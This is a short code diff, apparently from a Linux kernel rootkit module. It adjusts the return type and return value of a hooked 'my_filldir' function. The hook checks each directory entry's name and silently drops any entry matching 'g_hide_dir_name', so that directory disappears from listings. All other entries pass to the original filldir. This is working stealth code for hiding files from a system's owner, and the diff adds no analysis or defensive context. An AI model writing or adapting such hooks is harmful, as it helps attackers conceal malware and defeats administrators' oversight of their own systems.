@@ -30,7 +30,7 @@ static int my_filldir(struct dir_context *buf,
     return old_filldir(buf, name, namelen, offset, ino, d_type);
 }
 #else
-static bool my_filldir(struct dir_context *ctx,
+static int my_filldir(struct dir_context *ctx,
                        const char *name,
                        int namelen,
                        loff_t offset,
@@ -40,7 +40,7 @@ static bool my_filldir(struct dir_context *ctx,
     if (namelen == strlen(g_hide_dir_name) &&
         !strncmp(name, g_hide_dir_name, namelen))
     {
-        return true;
+        return 1;
     }
     return old_filldir(ctx, name, namelen, offset, ino, d_type);
 }
